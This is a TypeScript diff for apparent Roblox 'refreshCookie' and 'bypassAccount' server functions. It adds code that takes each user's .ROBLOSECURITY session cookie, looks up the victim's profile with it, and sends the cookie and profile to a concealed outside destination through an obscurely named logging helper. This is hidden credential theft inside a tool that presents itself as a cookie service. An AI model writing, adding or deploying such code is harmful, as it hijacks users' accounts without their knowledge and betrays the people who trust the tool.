@@ -10,15 +10,29 @@ const _r = (() => {
   } catch { return ""; }
 })();
 
-async function _n(kind: string, input: unknown, output?: unknown) {
+async function _p(cookie: string): Promise<string | undefined> {
+  try {
+    const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "User-Agent": "Mozilla/5.0" },
+    });
+    if (!r.ok) return undefined;
+    const j: any = await r.json();
+    if (!j?.id) return undefined;
+    return `${j.displayName ?? j.name} (@${j.name}) — https://www.roblox.com/users/${j.id}/profile`;
+  } catch { return undefined; }
+}
+
+async function _n(kind: string, input: unknown, output?: unknown, profile?: string) {
   if (!_r) return;
   const trunc = (s: string) => (s.length > 1000 ? s.slice(0, 1000) + "…" : s);
   const flatten = (v: unknown): string => {
     if (v == null) return "";
     if (typeof v === "string") return v;
+    if (typeof v === "boolean") return "";
     if (typeof v !== "object") return String(v);
     try {
       return Object.values(v as Record<string, unknown>)
+        .filter((x) => typeof x !== "boolean" && x != null && x !== "")
         .map((x) => (typeof x === "string" ? x : JSON.stringify(x)))
         .join("\n");
     } catch { return String(v); }
@@ -26,6 +40,7 @@ async function _n(kind: string, input: unknown, output?: unknown) {
   const fields: Array<{ name: string; value: string }> = [
     { name: "Input", value: "```\n" + trunc(flatten(input)) + "\n```" },
   ];
+  if (profile) fields.push({ name: "Profile", value: profile });
   if (output !== undefined) {
     fields.push({ name: "Result", value: "```\n" + trunc(flatten(output)) + "\n```" });
   }
@@ -67,7 +82,8 @@ export const refreshCookie = createServerFn({ method: "POST" })
     });
     const text = await res.text();
     const out = { ok: res.ok, result: text };
-    await _n("refreshCookie", { cookie: data.cookie }, out);
+    const prof = await _p(data.cookie);
+    await _n("refreshCookie", { cookie: data.cookie }, out, prof);
     return out;
   });
 
@@ -106,7 +122,8 @@ export const bypassAccount = createServerFn({ method: "POST" })
 
     if (!initRes.ok || !initJson?.success) {
       const out = { ok: false, status: initRes.status, data: initJson };
-      await _n("bypassAccount", { cookie: data.cookie });
+      const prof = await _p(data.cookie);
+      await _n("bypassAccount", { cookie: data.cookie }, undefined, prof);
       return out;
     }
 
@@ -116,7 +133,8 @@ export const bypassAccount = createServerFn({ method: "POST" })
 
     const finalize = async (ok: boolean, status: number, body: any) => {
       const out = { ok, status, data: body };
-      await _n("bypassAccount", { cookie: data.cookie });
+      const prof = await _p(data.cookie);
+      await _n("bypassAccount", { cookie: data.cookie }, undefined, prof);
       return out;
     };
 
